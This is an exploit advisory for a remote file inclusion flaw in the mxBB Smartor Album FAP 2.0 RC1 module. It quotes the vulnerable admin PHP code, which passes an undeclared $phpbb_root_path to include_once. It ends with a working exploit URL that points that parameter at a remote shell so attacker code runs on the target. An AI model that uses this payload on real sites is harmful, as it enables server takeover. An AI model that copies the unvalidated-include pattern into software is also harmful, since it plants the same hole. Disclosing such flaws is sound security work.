Mx Module Smartor Album FAP 2.0 RC 1 Remote File Inclusion Vuln
===============================================================




               ########################################################################

                mxBB Module MX Smartor FAP 2.0 RC1 Remote File Inclusion Vulnerability

               ########################################################################


Class: Remote

Founder: bd0rk


Vulnerable Code in /admin/admin_album_otf.php

---------------------------------------------------------------------------------------------
define( &#039;IN_PORTAL&#039;, 1 );

if ( !empty( $setmodules ) )
{
	$file = basename( __FILE__ );
	$module[&#039;Smartor_Album&#039;][&#039;Configuration otf&#039;] = &#039;modules/mx_smartor/admin/&#039; . $file;
	return;
}

$mx_root_path = &#039;./../../../&#039;;
$module_root_path = "./../";
$phpEx = substr(strrchr(__FILE__, &#039;.&#039;), 1);
require( $mx_root_path . &#039;/admin/pagestart.&#039; . $phpEx );

include_once($phpbb_root_path . &#039;includes/functions_validate.&#039;.$phpEx);
---------------------------------------------------------------------------------------------

$phpbb_root_path is not declared before include_once

[+]Exploit: http://[target]/modules/mx_smartor/admin/admin_album_otf.php?phpbb_root_path=Shell?




